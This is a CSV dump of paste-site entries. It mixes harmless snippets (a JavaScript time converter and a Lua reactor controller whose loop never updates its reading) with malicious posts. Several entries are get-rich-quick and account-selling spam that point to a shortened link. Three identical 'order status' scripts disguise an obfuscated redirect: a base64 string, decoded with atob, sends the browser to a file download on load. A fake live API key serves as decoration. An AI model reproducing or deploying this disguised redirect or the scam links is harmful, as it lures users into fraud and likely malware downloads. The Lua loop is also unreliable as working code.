id,title,username,language,date,content
u1vE97Qw,EARN $900 INSTANTLY 2025 BT,EmergencyFood,JavaScript,Sunday 30th of March 2025 07:02:53 AM CDT," 
Pdf https://tinyurl.com/methodssss


TpqGENg3WE
"
8UCwwdyp,Untitled,Onesible,JavaScript,Sunday 30th of March 2025 07:02:51 AM CDT,"function solve() {
    let daysInput = document.getElementById('days-input');
    let hoursInput = document.getElementById('hours-input');
    let minutesInput = document.getElementById('minutes-input');
    let secondsInput = document.getElementById('seconds-input');
    
    let daysBtn = document.getElementById('daysBtn');
    let hoursBtn = document.getElementById('hoursBtn');
    let minutesBtn = document.getElementById('minutesBtn');
    let secondsBtn = document.getElementById('secondsBtn');
    
    daysBtn.addEventListener('click', convertFromDays);
    hoursBtn.addEventListener('click', convertFromHours);
    minutesBtn.addEventListener('click', convertFromMinutes);
    secondsBtn.addEventListener('click', convertFromSeconds);
    
    function convertFromDays(e) {
        e.preventDefault();
        let inputDays = Number(daysInput.value);
        hoursInput.value = (inputDays * 24).toFixed(2);
        minutesInput.value = (inputDays * 1440).toFixed(2);
        secondsInput.value = (inputDays * 86400).toFixed(2);
    }
    
    function convertFromHours(e) {
        e.preventDefault();
        let inputHours = Number(hoursInput.value);
        daysInput.value = (inputHours / 24).toFixed(2);
        minutesInput.value = (inputHours * 60).toFixed(2);
        secondsInput.value = (inputHours * 3600).toFixed(2);
    }
    
    function convertFromMinutes(e) {
        e.preventDefault();
        let inputMinutes = Number(minutesInput.value);
        daysInput.value = (inputMinutes / 1440).toFixed(2);
        hoursInput.value = (inputMinutes / 60).toFixed(2);
        secondsInput.value = (inputMinutes * 60).toFixed(2);
    }
    
    function convertFromSeconds(e) {
        e.preventDefault();
        let inputSeconds = Number(secondsInput.value);
        daysInput.value = (inputSeconds / 86400).toFixed(2);
        hoursInput.value = (inputSeconds / 3600).toFixed(2);
        minutesInput.value = (inputSeconds / 60).toFixed(2);
    }
}"
JGYnXTc7,Order.js,iLoveToWatch,JavaScript,Sunday 30th of March 2025 06:52:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/723/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JkbwsrEi,Random Gmail Acc 1A,EmergencyFood,JavaScript,Sunday 30th of March 2025 06:46:54 AM CDT," 
Pdf https://tinyurl.com/methodssss


ISbtlIVE4Z
"
cBPxky3p,Market.js,iLoveToWatch,JavaScript,Sunday 30th of March 2025 06:37:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/560/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xQNxf4xg,Make $1000 15-MINUTES (BEGINNER) WM,EmergencyFood,JavaScript,Sunday 30th of March 2025 06:30:58 AM CDT," 
Pdf https://tinyurl.com/methodssss


L6T44Px3oW
"
UxcKQY4E,Binance account CW,EmergencyFood,JavaScript,Sunday 30th of March 2025 06:15:04 AM CDT," 
Pdf https://tinyurl.com/methodssss


w8LCKxJS49
"
EiT9sH93,Products.js,iLoveToWatch,JavaScript,Sunday 30th of March 2025 06:06:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/096/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HwfzKtMV,dataNone,TestGuy1,JSON,Sunday 30th of March 2025 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '435fd4035813f4feec589b52fe7146c230652161e8f1acd68d4eb7478c2637d4e80413d553402a24b207ecad0fc3cf5255219a89456480203330722b374b6669ab8ce5568b4e980fc662542855a25b6367a5f9fe57dce5b583e10f4f1657b89eb4bf914786f9bce99f10f62c538e46a20ff872934170257439886c0f61812a80',
  otherdata: [
    '531223d0a895579b146b8a9081a965da',
    '88b1c35a210aca41c866efdb2b2054bd',
    'd9bdb83042d2a79f31426ef4a80cf118',
    '265ad7b4c01d23f5fbe9f4ef659b7d4e',
    '9247543cb88d08a9473e86bb3a7da7f9',
    'e54cd5b2104b30dbe299130cedc2bde9',
    'dc33f629f967c0defac8eeed085d45eb',
    '4726e4e40b0828009ca45999586c4e8e'
  ]
}"
iBKiMfB9,Untitled,SmugTomato,Lua,Sunday 30th of March 2025 05:53:25 AM CDT,"local reactor = peripheral.find(""BiggerReactors_Reactor"")

if not reactor then
	print(""Reactor not found!"")
	return
end

local apiVersion = reactor.apiVersion()
local ambientTemp = reactor.ambientTemperature()
local casingTemp = reactor.casingTemperature()
local battery = reactor.battery()
local capacity = battery.capacity()
local stored = battery.stored()
local percentage = (stored / capacity) * 100

print(""Booting up ReactorControl..."")
sleep(0.1)

print(""API version "" .. apiVersion)
sleep(0.1)

print(""Ambient temperature "" .. ambientTemp)
sleep(0.1)

print(""Casing temperature "" .. casingTemp)
sleep(0.1)

print(""Energy stored: "" .. stored .. ""/"" .. capacity .. ""("" .. percentage .. ""%)"")
sleep(0.1)

while true do
	if percentage < 50 then
		reactor.setActive(true)
	end

	if percentage > 80 then
		reactor.setActive(false)
	end

	sleep(0.5)
end
"
